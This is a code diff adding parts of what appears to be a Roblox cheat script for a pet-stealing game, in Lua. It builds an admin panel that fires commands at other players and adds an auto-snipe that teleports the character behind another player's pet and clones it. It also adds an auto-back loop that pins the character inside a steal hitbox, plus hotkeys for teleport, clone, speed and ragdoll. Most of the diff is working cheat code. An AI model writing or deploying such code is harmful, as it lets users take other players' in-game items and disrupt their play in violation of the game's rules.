+        blQuickBtn.TextSize = 13
+        blQuickBtn.Font = Enum.Font.GothamBlack
+        blQuickBtn.TextColor3 = Color3.fromRGB(255, 200, 200)
+        blQuickBtn.ZIndex = 11
+        blQuickBtn.Active = true
+        blQuickBtn.BackgroundColor3 = Color3.fromRGB(120, 20, 20)
+        blQuickBtn.BackgroundTransparency = 0
+        Instance.new("UICorner", blQuickBtn).CornerRadius = UDim.new(0, 8)
+        local blQuickStroke = Instance.new("UIStroke", blQuickBtn)
+        blQuickStroke.Color = Color3.fromRGB(200, 50, 50)
+        blQuickStroke.Thickness = 1.5
+        blQuickStroke.Transparency = 0.3
+        blQuickStroke.ZIndex = 12
+
+        blQuickBtn.MouseEnter:Connect(function()
+            blQuickBtn.BackgroundColor3 = Color3.fromRGB(180, 30, 30)
+            blQuickStroke.Transparency = 0.05
+        end)
+        blQuickBtn.MouseLeave:Connect(function()
+            blQuickBtn.BackgroundColor3 = Color3.fromRGB(120, 20, 20)
+            blQuickStroke.Transparency = 0.3
+        end)
+
+        blQuickBtn.MouseButton1Click:Connect(function()
+            local targetName = plr.Name
+            local alreadyIn = false
+            for _, n in ipairs(BlacklistedPlayers) do
+                if n:lower() == targetName:lower() then
+                    alreadyIn = true
+                    break
+                end
+            end
+            if alreadyIn then
+                ShowNotification("BLACKLIST", targetName .. " is already blacklisted")
+                return
+            end
+            table.insert(BlacklistedPlayers, targetName)
+            Config.Blacklist = BlacklistedPlayers
+            SaveConfig()
+                if refreshBlacklistUI then refreshBlacklistUI() end
+            blQuickBtn.BackgroundColor3 = Color3.fromRGB(30, 120, 50)
+            blQuickBtn.Text = "OK"
+            ShowNotification("BLACKLIST", "Blacklisted: " .. targetName)
+            rebuildBlList()
+            task.delay(1.2, function()
+                if blQuickBtn and blQuickBtn.Parent then
+                    blQuickBtn.BackgroundColor3 = Color3.fromRGB(120, 20, 20)
+                    blQuickBtn.Text = "X"
+                end
+            end)
+        end)
+        -- â”€â”€ End quick blacklist button â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+        local rowHighlight = Instance.new("Frame", row)
+        rowHighlight.Size = UDim2.new(1, 0, 1, 0)
+        rowHighlight.BackgroundColor3 = Theme.Accent1
+        rowHighlight.BackgroundTransparency = 1
+        rowHighlight.BorderSizePixel = 0
+        rowHighlight.ZIndex = 1
+        Instance.new("UICorner", rowHighlight).CornerRadius = UDim.new(0, 6)
+        row.MouseEnter:Connect(function()
+            rowHighlight.BackgroundTransparency = 0.7
+        end)
+        row.MouseLeave:Connect(function()
+            rowHighlight.BackgroundTransparency = 1
+        end)
+        row.MouseButton1Click:Connect(function()
+            local hasAnyAvailable = false
+            for _, cmd in ipairs(ALL_COMMANDS) do
+                if not isOnCooldown(cmd) then
+                    hasAnyAvailable = true
+                    break
+                end
+            end
+            if hasAnyAvailable then
+                if isBlacklisted(plr.Name) then
+                    ShowNotification("ADMIN", plr.Name .. " is blacklisted")
+                    return
+                end
+                triggerAll(plr)
+                ShowNotification("ADMIN", "Triggered ALL on " .. plr.Name)
+            end
+        end)
+        return row
+    end
+
+    local playerRows = {}
+    local playerRowsByUserId = {}
+    
+    local function addPlayer(plr)
+        if plr == LocalPlayer or playerRowsByUserId[plr.UserId] then return end
+        if not Players:FindFirstChild(plr.Name) then return end
+        
+        if playerRows[plr] then return end
+        
+        local row = createPlayerRow(plr)
+        playerRows[plr] = row
+        playerRowsByUserId[plr.UserId] = {player = plr, row = row}
+        listFrame.CanvasSize = UDim2.new(0,0,0, layout.AbsoluteContentSize.Y)
+        sortAdminPanelList()
+    end
+    
+    local function removePlayer(plr)
+        local userId = plr and plr.UserId or nil
+        local entry = userId and playerRowsByUserId[userId] or nil
+        local row = entry and entry.row or playerRows[plr]
+        
+        if row then
+            if row.Parent then
+                for cmd, buttons in pairs(SharedState.AdminButtonCache) do
+                    for i = #buttons, 1, -1 do
+                        if buttons[i] and buttons[i].Parent == row then
+                            table.remove(buttons, i)
+                        end
+                    end
+                end
+                row:Destroy()
+            end
+            if plr then
+                playerRows[plr] = nil
+            end
+            if userId then
+                playerRowsByUserId[userId] = nil
+            end
+            if SharedState.BalloonedPlayers and userId then
+                SharedState.BalloonedPlayers[userId] = nil
+            end
+            listFrame.CanvasSize = UDim2.new(0,0,0, layout.AbsoluteContentSize.Y)
+        end
+    end
+
+    refreshBtn.MouseButton1Click:Connect(function()
+        for _, row in pairs(playerRows) do
+            if row and row.Parent then
+                for cmd, buttons in pairs(SharedState.AdminButtonCache) do
+                    for i = #buttons, 1, -1 do
+                        if buttons[i] and buttons[i].Parent == row then
+                            table.remove(buttons, i)
+                        end
+                    end
+                end
+                row:Destroy()
+            end
+        end
+        
+        playerRows = {}
+        playerRowsByUserId = {}
+        SharedState.AdminButtonCache = {}
+        SharedState.BalloonedPlayers = {}
+        
+        for _, child in ipairs(listFrame:GetChildren()) do
+            if child:IsA("TextButton") then
+                child:Destroy()
+            end
+        end
+        
+        task.wait(0.1)
+        
+        for _, p in ipairs(Players:GetPlayers()) do
+            if p ~= LocalPlayer then 
+                addPlayer(p) 
+            end
+        end
+        sortAdminPanelList()
+        
+        ShowNotification("ADMIN PANEL", "Completely refreshed - " .. #Players:GetPlayers() - 1 .. " players found")
+    end)
+
+    Players.PlayerAdded:Connect(function(plr)
+        task.wait(0.1)
+        if plr and plr.Parent then
+            addPlayer(plr)
+        end
+    end)
+    
+    Players.PlayerRemoving:Connect(function(plr)
+        removePlayer(plr)
+    end)
+    
+    for _, p in ipairs(Players:GetPlayers()) do
+        if p ~= LocalPlayer then addPlayer(p) end
+    end
+    sortAdminPanelList()
+
+    task.spawn(function()
+        while listFrame and listFrame.Parent do
+            task.wait(0.5)
+            pcall(sortAdminPanelList)
+        end
+    end)
+    
+    task.spawn(function()
+        while true do
+            task.wait(1)
+            local currentPlayerIds = {}
+            for _, p in ipairs(Players:GetPlayers()) do
+                if p ~= LocalPlayer and p.Parent then
+                    currentPlayerIds[p.UserId] = true
+                end
+            end
+            
+            for userId, entry in pairs(playerRowsByUserId) do
+                if not currentPlayerIds[userId] or not entry.player or not entry.player.Parent or not Players:FindFirstChild(entry.player.Name) then
+                    removePlayer(entry.player)
+                end
+            end
+            
+            for _, p in ipairs(Players:GetPlayers()) do
+                if p ~= LocalPlayer and p.Parent and not playerRowsByUserId[p.UserId] then
+                    addPlayer(p)
+                end
+            end
+        end
+    end)
+    
+    layout.Changed:Connect(function() listFrame.CanvasSize = UDim2.new(0,0,0, layout.AbsoluteContentSize.Y) end)
+end)
+
+local function findFlyingCarpet()
+    local map = Workspace:FindFirstChild("Map")
+    if not map then return nil end
+    local carpet = map:FindFirstChild("Carpet")
+    if not carpet then return nil end
+    if carpet:IsA("Model") then
+        if carpet.PrimaryPart then return carpet.PrimaryPart end
+        for _, c in ipairs(carpet:GetChildren()) do if c:IsA("BasePart") then return c end end
+    elseif carpet:IsA("BasePart") then
+        return carpet
+    end
+    return nil
+end
+
+local function findClaimModel(podium)
+    if not podium or not podium.Parent then return nil end
+    local claim = podium:FindFirstChild("Claim")
+    if claim and claim:IsA("Model") then
+        if claim.PrimaryPart then return claim.PrimaryPart end
+        for _, c in ipairs(claim:GetChildren()) do if c:IsA("BasePart") then return c end end
+    end
+    return nil
+end
+
+local function getTargetPodiumAndSafePosition(animalData, fallbackPos)
+    if not animalData or not animalData.plot then return nil, fallbackPos end
+    local plots = Workspace:FindFirstChild("Plots")
+    local plot = plots and plots:FindFirstChild(animalData.plot)
+    local podiums = plot and plot:FindFirstChild("AnimalPodiums")
+    if not podiums then return nil, fallbackPos end
+    local safeName = (fallbackPos and fallbackPos.Y > 8.8) and "13" or "3"
+    local safePod = podiums:FindFirstChild(safeName)
+    local safeBase = safePod and safePod:FindFirstChild("Base")
+    local safeSpawn = safeBase and safeBase:FindFirstChild("Spawn")
+    return safePod, (safeSpawn and safeSpawn:IsA("BasePart") and safeSpawn.Position) or fallbackPos
+end
+
+local function playFullScreenFlash()
+    local flashGui = Instance.new("ScreenGui")
+    flashGui.Name = "AutoTPFlash"
+    flashGui.ResetOnSpawn = false
+    flashGui.DisplayOrder = 999999
+    flashGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    flashGui.IgnoreGuiInset = true
+    flashGui.Parent = PlayerGui
+
+    local flashFrame = Instance.new("Frame")
+    flashFrame.Size = UDim2.new(1, 0, 1, 0)
+    flashFrame.Position = UDim2.new(0, 0, 0, 0)
+    flashFrame.AnchorPoint = Vector2.new(0, 0)
+    flashFrame.BackgroundColor3 = Color3.new(1, 1, 1)
+    flashFrame.BackgroundTransparency = 1
+    flashFrame.BorderSizePixel = 0
+    flashFrame.Parent = flashGui
+
+    local tweenIn = TweenService:Create(flashFrame, TweenInfo.new(0.075, Enum.EasingStyle.Linear), {BackgroundTransparency = 0})
+    local tweenOut = TweenService:Create(flashFrame, TweenInfo.new(0.125, Enum.EasingStyle.Linear), {BackgroundTransparency = 1})
+    tweenIn:Play()
+    tweenIn.Completed:Connect(function()
+        tweenOut:Play()
+        tweenOut.Completed:Connect(function()
+            flashGui:Destroy()
+        end)
+    end)
+end
+
+local isTpMoving = State.isTpMoving
+
+_G._isTargetPlotUnlocked = function(plotName)
+    local ok, res = pcall(function()
+        local plots = Workspace:FindFirstChild("Plots")
+        if not plots then return false end
+        local targetPlot = plots:FindFirstChild(plotName)
+        if not targetPlot then return false end
+        local unlockFolder = targetPlot:FindFirstChild("Unlock")
+        if not unlockFolder then return true end
+        local unlockItems = {}
+        for _, item in pairs(unlockFolder:GetChildren()) do
+            local pos = nil
+            if item:IsA("Model") then pcall(function() pos = item:GetPivot().Position end)
+            elseif item:IsA("BasePart") then pos = item.Position end
+            if pos then table.insert(unlockItems, {Object = item, Height = pos.Y}) end
+        end
+        table.sort(unlockItems, function(a, b) return a.Height < b.Height end)
+        if #unlockItems == 0 then return true end
+        local floor1Door = unlockItems[1].Object
+        for _, desc in ipairs(floor1Door:GetDescendants()) do
+            if desc:IsA("ProximityPrompt") and desc.Enabled then return false end
+        end
+        for _, child in ipairs(floor1Door:GetChildren()) do
+            if child:IsA("ProximityPrompt") and child.Enabled then return false end
+        end
+        return true
+    end)
+    return ok and res or false
+end
+
+local function runAutoSnipe()
+    if State.isTpMoving then return end
+    _G.posUnlocked = false
+
+    if State.carpetSpeedEnabled then
+        setCarpetSpeed(false)
+        if _carpetStatusLabel then _carpetStatusLabel.Text="OFF"; _carpetStatusLabel.TextColor3=Theme.Error end
+    end
+
+    local targetPetData = nil
+    if Config.AutoTPPriority then
+        local bestEntry = nil
+        local cache = SharedState.AllAnimalsCache
+        if cache and type(cache)=="table" then
+            for _, pName in ipairs(PRIORITY_LIST) do
+                local sn = pName:lower()
+                for _, a in ipairs(cache) do
+                    if a and a.name and a.name:lower()==sn and a.owner~=LocalPlayer.Name then bestEntry=a; break end
+                end
+                if bestEntry then break end
+            end
+            if not bestEntry then
+                for _, a in ipairs(cache) do
+                    if a and a.owner~=LocalPlayer.Name then bestEntry=a; break end
+                end
+            end
+        end
+        if bestEntry then targetPetData=bestEntry
+        else
+            if not SharedState.SelectedPetData then ShowNotification("ERROR","No target selected!"); return end
+            targetPetData=SharedState.SelectedPetData.animalData
+        end
+    else
+        if not SharedState.SelectedPetData then ShowNotification("ERROR","No target selected!"); return end
+        targetPetData = SharedState.SelectedPetData.animalData
+    end
+    if not targetPetData then return end
+
+    local char = LocalPlayer.Character
+    local hrp  = char and char:FindFirstChild("HumanoidRootPart")
+    local hum  = char and char:FindFirstChild("Humanoid")
+    if not hrp or not hum or hum.Health<=0 then return end
+
+    State.isTpMoving = true; isTpMoving = State.isTpMoving
+    playFullScreenFlash()
+    local function finishTeleport()
+        State.isTpMoving = false
+        isTpMoving = State.isTpMoving
+    end
+
+    local targetPart = findAdorneeGlobal(targetPetData)
+    if not targetPart then finishTeleport(); return end
+
+    local exactPos   = targetPart.Position
+    local targetPodium, targetPosition = getTargetPodiumAndSafePosition(targetPetData, exactPos)
+    local isSecondFloor = targetPosition.Y > 10
+    local claimPart = findClaimModel(targetPodium)
+
+    local directionToPet = targetPosition - hrp.Position
+    if directionToPet.Magnitude > 0 then
+        directionToPet = Vector3.new(directionToPet.X, 0, directionToPet.Z).Unit
+    else
+        directionToPet = Vector3.new(0, 0, -1)
+    end
+
+    local dirBehind
+    if claimPart then
+        local df = claimPart.Position - targetPosition
+        if df.Magnitude > 0 then
+            dirBehind = -Vector3.new(df.X, 0, df.Z).Unit
+        else
+            dirBehind = -directionToPet
+        end
+    else
+        dirBehind = -directionToPet
+    end
+
+    local behindPos = targetPosition + (dirBehind * 7)
+    local rpPre = RaycastParams.new()
+    rpPre.FilterDescendantsInstances = {char}
+    rpPre.FilterType = Enum.RaycastFilterType.Exclude
+    local resPre = Workspace:Raycast(
+        Vector3.new(behindPos.X, targetPosition.Y + 10, behindPos.Z),
+        Vector3.new(0, -1000, 0),
+        rpPre
+    )
+    if not resPre then finishTeleport(); return end
+    local finalHeight = resPre.Position.Y + 5.5
+    local finalPos = Vector3.new(behindPos.X, finalHeight, behindPos.Z)
+    local lookTarget = claimPart and Vector3.new(claimPart.Position.X, finalPos.Y, claimPart.Position.Z) or targetPosition
+
+    local finalFacing = CFrame.lookAt(finalPos, lookTarget)
+    local facingRot = finalFacing - finalFacing.Position
+    hrp.CFrame = CFrame.new(hrp.Position) * facingRot
+
+    if hrp.Position.Y > 25 and targetPosition.Y > 25 then
+        hrp.AssemblyLinearVelocity = Vector3.zero
+        hrp.AssemblyAngularVelocity = Vector3.zero
+        hrp.CFrame = CFrame.new(finalPos) * facingRot
+        hrp.AssemblyLinearVelocity = Vector3.zero
+        hrp.AssemblyAngularVelocity = Vector3.zero
+    else
+        local carpetName = Config.TpSettings.Tool or "Flying Carpet"
+        local carpet = LocalPlayer.Backpack:FindFirstChild(carpetName) or char:FindFirstChild(carpetName)
+        if carpet and hum and hum.Parent then
+            hum:EquipTool(carpet)
+            task.wait(0.1)
+        end
+
+        if not char.Parent or not hrp.Parent then
+            finishTeleport(); return
+        end
+
+        hrp.CFrame = CFrame.new(hrp.Position) * facingRot
+        local v = hrp.AssemblyLinearVelocity
+        hrp.AssemblyLinearVelocity = Vector3.new(v.X, 200, v.Z)
+        task.wait(0.15)
+
+        if not char.Parent or not hrp.Parent then
+            finishTeleport(); return
+        end
+
+        local positionBehindPet = targetPosition + (dirBehind * 18)
+        local carpetPart = findFlyingCarpet()
+        if not carpetPart then
+            finishTeleport(); return
+        end
+
+        if hum and hum.Parent then
+            local state = hum:GetState()
+            if state ~= Enum.HumanoidStateType.Jumping and state ~= Enum.HumanoidStateType.Freefall then
+                hum:ChangeState(Enum.HumanoidStateType.Jumping)
+                task.wait(0.04)
+            end
+        end
+
+        if not char.Parent or not hrp.Parent then
+            finishTeleport(); return
+        end
+
+        local carpetPos = carpetPart.Position
+        local carpetPosAtHeight = Vector3.new(carpetPos.X, hrp.Position.Y, positionBehindPet.Z)
+        hrp.CFrame = CFrame.new(carpetPosAtHeight) * facingRot
+        task.wait(0.1)
+
+        if not char.Parent or not hrp.Parent then
+            finishTeleport(); return
+        end
+
+        hrp.AssemblyLinearVelocity = Vector3.zero
+        hrp.AssemblyAngularVelocity = Vector3.zero
+        hrp.CFrame = CFrame.new(finalPos) * facingRot
+        hrp.AssemblyLinearVelocity = Vector3.zero
+        hrp.AssemblyAngularVelocity = Vector3.zero
+    end
+
+    task.wait(0.06)
+    task.wait(0.25)
+    instantClone()
+    while _G.isCloning do task.wait() end
+
+    finishTeleport()
+    local shouldForceInstantAutoBack = (not isSecondFloor) and (_G._isTargetPlotUnlocked and _G._isTargetPlotUnlocked(targetPetData.plot) == true)
+    if Config.AutoBack and shouldForceInstantAutoBack and _G.forceAutoBackInstant then
+        -- Trigger exactly once, only after teleport has fully completed.
+        pcall(function() _G.forceAutoBackInstant(1) end)
+    end
+end
+_G.runAutoSnipe = runAutoSnipe
+
+;(function()
+    local function isInsideStealHitbox()
+        local char = LocalPlayer.Character
+        if not char then return false end
+        local hrp = char:FindFirstChild("HumanoidRootPart")
+        if not hrp then return false end
+
+        local petData = SharedState.SelectedPetData
+        if not petData then return false end
+        local animalData = petData.animalData or petData
+        if not animalData or not animalData.plot then return false end
+
+        local Plots = Workspace:FindFirstChild("Plots")
+        if not Plots then return false end
+        local plot = Plots:FindFirstChild(animalData.plot)
+        if not plot then return false end
+
+        local stealHitbox = plot:FindFirstChild("StealHitbox")
+        if not stealHitbox then return false end
+
+        local playerPos = hrp.Position
+
+        local function checkPart(part)
+            local cf = part.CFrame
+            local sz = part.Size
+            local lp = cf:PointToObjectSpace(playerPos)
+            return math.abs(lp.X) <= sz.X/2
+               and math.abs(lp.Y) <= sz.Y/2
+               and math.abs(lp.Z) <= sz.Z/2
+        end
+
+        if stealHitbox:IsA("BasePart") then
+            return checkPart(stealHitbox)
+        elseif stealHitbox:IsA("Model") then
+            for _, part in ipairs(stealHitbox:GetDescendants()) do
+                if part:IsA("BasePart") and part.Transparency < 1 then
+                    if checkPart(part) then return true end
+                end
+            end
+        end
+        return false
+    end
+
+    local _autoBackThread = nil
+    local _autoBackStealConn = nil
+    local _teleportingBelow = false
+    local _forceAutoBackInstantCount = 0
+
+    local function stopAutoBack()
+        if _autoBackThread then task.cancel(_autoBackThread); _autoBackThread = nil end
+        if _autoBackStealConn then _autoBackStealConn:Disconnect(); _autoBackStealConn = nil end
+        local char = LocalPlayer.Character
+        local hrp = char and char:FindFirstChild("HumanoidRootPart")
+        if hrp then
+            local bp = hrp:FindFirstChild("TP_BodyPosition")
+            if bp then bp:Destroy() end
+        end
+        _teleportingBelow = false
+    end
+
+    local function getAutoBackTarget()
+        local petData = SharedState.SelectedPetData
+        if not petData then return nil end
+        local animalData = petData.animalData or petData
+        local part = findAdorneeGlobal(animalData)
+        if not part then return nil end
+        return part.Position, animalData
+    end
+
+    local function teleportBelowPet()
+        if _G.posUnlocked then return end
+        if _teleportingBelow then return end
+        _teleportingBelow = true
+        pcall(function()
+            local targetPos, animalData = getAutoBackTarget()
+            if not targetPos then return end
+
+            local char = LocalPlayer.Character
+            if not char then return end
+            local hrp = char:FindFirstChild("HumanoidRootPart")
+            local hum = char:FindFirstChildOfClass("Humanoid")
+            if not hrp or not hum then return end
+
+            local petX, petY, petZ = targetPos.X, targetPos.Y, targetPos.Z
+            local playerY = hrp.Position.Y
+
+            if playerY > 25 and petY > 25 then
+                hrp.CFrame = CFrame.new(targetPos)
+                hrp.AssemblyLinearVelocity = Vector3.zero
+                hrp.AssemblyAngularVelocity = Vector3.zero
+                _teleportingBelow = false
+                return
+            end
+
+            if playerY >= 8.8 and petY < 8.8 then return end
+            if playerY <= 8.8 and petY > 24 then return end
+
+            local carpetName = Config.TpSettings and Config.TpSettings.Tool or "Flying Carpet"
+            local carpet = LocalPlayer.Backpack:FindFirstChild(carpetName) or char:FindFirstChild(carpetName)
+            if carpet and hum then hum:EquipTool(carpet); task.wait(0.1) end
+
+            local targetY
+            if petY > 22 or (playerY < 8.8 and petY >= 8.8) then
+                targetY = petY - 7.5
+            else
+                local rp = RaycastParams.new()
+                rp.FilterDescendantsInstances = {char}
+                rp.FilterType = Enum.RaycastFilterType.Exclude
+                local res = Workspace:Raycast(Vector3.new(petX, petY, petZ), Vector3.new(0, -200, 0), rp)
+                targetY = res and (res.Position.Y + 1.4) or 0.5
+            end
+
+            local tPos = Vector3.new(petX, targetY, petZ)
+            local dist = (Vector3.new(hrp.Position.X, targetY, hrp.Position.Z) - tPos).Magnitude
+
+            if dist > 1.5 or math.abs(hrp.Position.Y - targetY) > 2 then
+                hrp.CFrame = CFrame.new(petX, targetY, petZ)
+                hrp.AssemblyLinearVelocity = Vector3.zero
+                hrp.AssemblyAngularVelocity = Vector3.zero
+            end
+
+            local bp = hrp:FindFirstChild("TP_BodyPosition")
+            if not bp then
+                bp = Instance.new("BodyPosition")
+                bp.Name = "TP_BodyPosition"
+                bp.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
+                bp.P = 10000
+                bp.D = 500
+                bp.Parent = hrp
+            end
+            bp.Position = tPos
+            bp.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
+        end)
+        _teleportingBelow = false
+    end
+
+    local function startAutoBack()
+        stopAutoBack()
+
+        _autoBackStealConn = LocalPlayer:GetAttributeChangedSignal("Stealing"):Connect(function()
+            if LocalPlayer:GetAttribute("Stealing") == true then
+                local char = LocalPlayer.Character
+                local hrp = char and char:FindFirstChild("HumanoidRootPart")
+                if hrp then
+                    local bp = hrp:FindFirstChild("TP_BodyPosition")
+                    if bp then bp:Destroy() end
+        task.spawn(function()
+                task.wait(0.1)
+                        local rp = RaycastParams.new()
+                        rp.FilterDescendantsInstances = {char}
+                        rp.FilterType = Enum.RaycastFilterType.Exclude
+                        local res = Workspace:Raycast(
+                            Vector3.new(hrp.Position.X, hrp.Position.Y, hrp.Position.Z),
+                            Vector3.new(0, -200, 0), rp
+                        )
+                        local floorY = res and (res.Position.Y + 1.4) or 0.5
+                        hrp.CFrame = CFrame.new(hrp.Position.X, floorY, hrp.Position.Z)
+                    end)
+                end
+            end
+        end)
+
+        local lastTeleportTime = 0
+
+        _autoBackThread = task.spawn(function()
+            while Config.AutoBack do
+                pcall(function()
+                    local stealing = LocalPlayer:GetAttribute("Stealing")
+                    local char = LocalPlayer.Character
+                    local hrp = char and char:FindFirstChild("HumanoidRootPart")
+                    if not hrp then return end
+
+                    if stealing == true then
+                        local bp = hrp:FindFirstChild("TP_BodyPosition")
+                        if bp then bp:Destroy() end
+                        return
+                    end
+
+                    local hasBP = hrp:FindFirstChild("TP_BodyPosition") ~= nil
+                    local targetPos = getAutoBackTarget()
+                    local inHitbox = isInsideStealHitbox()
+                    local selected = SharedState.SelectedPetData
+                    local selectedAnimal = selected and (selected.animalData or selected)
+                    local targetPlotOpen = false
+                    if selectedAnimal and selectedAnimal.plot and _G._isTargetPlotUnlocked then
+                        targetPlotOpen = (_G._isTargetPlotUnlocked(selectedAnimal.plot) == true)
+                    end
+
+                    local forceInstantNow = (_forceAutoBackInstantCount or 0) > 0
+                    local canAutoBackNow = (not _G.posUnlocked) and (forceInstantNow or (inHitbox and not targetPlotOpen))
+                    if not hasBP and not _teleportingBelow and targetPos and canAutoBackNow then
+                        local now = os.clock()
+                        local delay = forceInstantNow and 0 or 0.05
+                        if now - lastTeleportTime >= delay then
+                            teleportBelowPet()
+                            if forceInstantNow and _forceAutoBackInstantCount > 0 then
+                                _forceAutoBackInstantCount = _forceAutoBackInstantCount - 1
+                            end
+                            lastTeleportTime = now
+                        end
+                    end
+                end)
+                task.wait(0.01)
+            end
+            stopAutoBack()
+        end)
+    end
+
+    if not Config.AutoBack then Config.AutoBack = false end
+
+    _G.isInsideStealHitbox = isInsideStealHitbox
+    _G.startAutoBack = startAutoBack
+    _G.stopAutoBack = stopAutoBack
+    _G.forceAutoBackInstant = function(times)
+        _forceAutoBackInstantCount = math.max(tonumber(times) or 1, 1)
+    end
+
+    if Config.AutoBack then startAutoBack() end
+end)()
+
+local function executeReset()
+    ShowNotification("RESET", "Reiniciando personagem...")
+    local plr = LocalPlayer
+    if not plr then return end
+
+    task.spawn(function()
+        pcall(function()
+            local char = plr.Character
+            if not char then return end
+
+            local hum = char:FindFirstChildWhichIsA("Humanoid")
+            if hum then hum:ChangeState(Enum.HumanoidStateType.Dead) end
+
+            char:ClearAllChildren()
+
+            local dummy = Instance.new("Model")
+            dummy.Parent = Workspace
+            plr.Character = dummy
+            plr.Character = char
+            dummy:Destroy()
+        end)
+    end)
+end
+
+task.spawn(function()
+    local function checkSteal(gui)
+        if not Config.AutoKickOnSteal then return end
+        local txt = (gui:IsA("TextLabel") or gui:IsA("TextButton")) and gui.Text
+        if txt and string.find(txt, "You stole") then
+            kickPlayer()
+        end
+    end
+    PlayerGui.DescendantAdded:Connect(function(gui)
+        checkSteal(gui)
+        if gui:IsA("TextLabel") or gui:IsA("TextButton") then
+            gui:GetPropertyChangedSignal("Text"):Connect(function()
+                checkSteal(gui)
+            end)
+        end
+    end)
+    for _, gui in ipairs(PlayerGui:GetDescendants()) do
+        checkSteal(gui)
+    end
+end)
+
+UserInputService.InputBegan:Connect(function(input, processed)
+    if processed then return end
+    
+    local tpKey = safeKeyCode(Config.TpSettings.TpKey, Enum.KeyCode.T)
+    local cloneKey = safeKeyCode(Config.TpSettings.CloneKey, Enum.KeyCode.V)
+    local carpetKey = safeKeyCode(Config.TpSettings.CarpetSpeedKey, Enum.KeyCode.Q)
+    local stealSpeedKey = safeKeyCode(Config.StealSpeedKey, Enum.KeyCode.Z)
+    local resetKey = safeKeyCode(Config.ResetKey, Enum.KeyCode.X)
+    local ragdollKey = safeKeyCode(Config.RagdollSelfKey, Enum.KeyCode.R)
+
+    if input.KeyCode == tpKey then
+        if _G._activePinConn then _G._activePinConn:Disconnect(); _G._activePinConn = nil end
+        if _G._activePlat and _G._activePlat.Parent then _G._activePlat:Destroy(); _G._activePlat = nil end
+        if _G.tpToBestBrainrot then pcall(_G.tpToBestBrainrot) else pcall(runAutoSnipe) end
+    end
+
+    if input.KeyCode == cloneKey then
+        if _G._activePinConn then _G._activePinConn:Disconnect(); _G._activePinConn = nil end
+        if _G._activePlat and _G._activePlat.Parent then _G._activePlat:Destroy(); _G._activePlat = nil end
+        instantClone()
+    end
+    
+    if input.KeyCode == carpetKey then
+        carpetSpeedEnabled = not carpetSpeedEnabled
+        setCarpetSpeed(carpetSpeedEnabled)
+        if _carpetStatusLabel then
+            _carpetStatusLabel.Text = carpetSpeedEnabled and "ON" or "OFF"
+            _carpetStatusLabel.TextColor3 = carpetSpeedEnabled and Theme.Success or Theme.Error
+        end
+        ShowNotification("CARPET SPEED", carpetSpeedEnabled and ("ON  |  "..Config.TpSettings.Tool.."  |  140") or "OFF")
+    end
+
+    if input.KeyCode == stealSpeedKey then
+        if SharedState.StealSpeedToggleFunc then
+            SharedState.StealSpeedToggleFunc()
+        end
+    end
+
+    if input.KeyCode == resetKey then
+        executeReset()
+    end
+    
+    if input.KeyCode == ragdollKey then
+        task.spawn(function()
+            if _G.runAdminCommand then
+                if _G.runAdminCommand(LocalPlayer, "ragdoll") then
+                    ShowNotification("RAGDOLL SELF", "Triggered")
+                else
+                    ShowNotification("RAGDOLL SELF", "Failed")
+                end
+            else
+                ShowNotification("RAGDOLL SELF", "Function not available")
+            end
+        end)
+    end
+
+end)
+
+local settingsGui = UI.settingsGui
+
+settingsGui = Instance.new("ScreenGui")
+settingsGui.Name = "SettingsUI"; settingsGui.ResetOnSpawn = false
+settingsGui.Parent = PlayerGui; settingsGui.Enabled = false
+
+local sFrame = Instance.new("Frame")
+sFrame.Size = UDim2.new(0, 300, 0, 650)
+sFrame.Position = UDim2.new(Config.Positions.Settings.X, 0, Config.Positions.Settings.Y, 0)
+sFrame.BackgroundColor3 = Theme.Background; sFrame.BackgroundTransparency = 0.05
+sFrame.BorderSizePixel = 0; sFrame.ClipsDescendants = true; sFrame.Parent = settingsGui
+
+
+Instance.new("UICorner", sFrame).CornerRadius = UDim.new(0, 12)
+local sStroke = Instance.new("UIStroke", sFrame)
+sStroke.Color = Theme.Accent2; sStroke.Thickness = 1.5; sStroke.Transparency = 0.4
+CreateGradient(sStroke)
+task.defer(function() if addRacetrackBorder then addRacetrackBorder(sFrame, Theme.Accent1, 4) end end)
+
+local sHeader = Instance.new("Frame", sFrame)
+sHeader.Size = UDim2.new(1,0,0,40); sHeader.BackgroundTransparency = 1
+MakeDraggable(sHeader, sFrame, "Settings") 
+local sTitle = Instance.new("TextLabel", sHeader)
+sTitle.Size = UDim2.new(1,-20,1,0); sTitle.Position = UDim2.new(0,15,0,0)
+sTitle.BackgroundTransparency = 1; sTitle.Text = "SETTINGS"
+sTitle.Font = Enum.Font.GothamBlack; sTitle.TextSize = 16
+sTitle.TextColor3 = Theme.TextPrimary; sTitle.TextXAlignment = Enum.TextXAlignment.Left
+
+local sList = Instance.new("ScrollingFrame", sFrame)
+sList.Size = UDim2.new(1,-20,1,-50); sList.Position = UDim2.new(0,10,0,45)
+sList.BackgroundTransparency = 1; sList.BorderSizePixel = 0
+sList.ScrollBarThickness = 0; sList.ScrollBarImageColor3 = Theme.Accent1
+
+local sLayout = Instance.new("UIListLayout", sList)
+sLayout.Padding = UDim.new(0,8); sLayout.SortOrder = Enum.SortOrder.LayoutOrder
+
+local function CreateToggleSwitch(parent, initialState, callback)
+    local sw = Instance.new("Frame")
+    sw.Size = UDim2.new(0,40,0,20); sw.Position = UDim2.new(1,-50,0.5,-10)
+    sw.BackgroundColor3 = initialState and Theme.Success or Theme.SurfaceHighlight
+    Instance.new("UICorner", sw).CornerRadius = UDim.new(1,0); sw.Parent = parent
+    local dot = Instance.new("Frame")
+    dot.Size = UDim2.new(0,16,0,16)
+    dot.Position = initialState and UDim2.new(1,-18,0.5,-8) or UDim2.new(0,2,0.5,-8)
+    dot.BackgroundColor3 = Color3.fromRGB(255,255,255)
+    Instance.new("UICorner", dot).CornerRadius = UDim.new(1,0); dot.Parent = sw
+    local btn = Instance.new("TextButton"); btn.Size = UDim2.new(1,0,1,0)
+    btn.BackgroundTransparency = 1; btn.Text = ""; btn.Parent = sw
+    local isOn = initialState
+    local function SetState(s)
+        isOn = s
+        local tp = isOn and UDim2.new(1,-18,0.5,-8) or UDim2.new(0,2,0.5,-8)
+        local tc = isOn and Theme.Success or Theme.SurfaceHighlight
+        TweenService:Create(dot, TweenInfo.new(0.2,Enum.EasingStyle.Quad,Enum.EasingDirection.Out), {Position=tp}):Play()
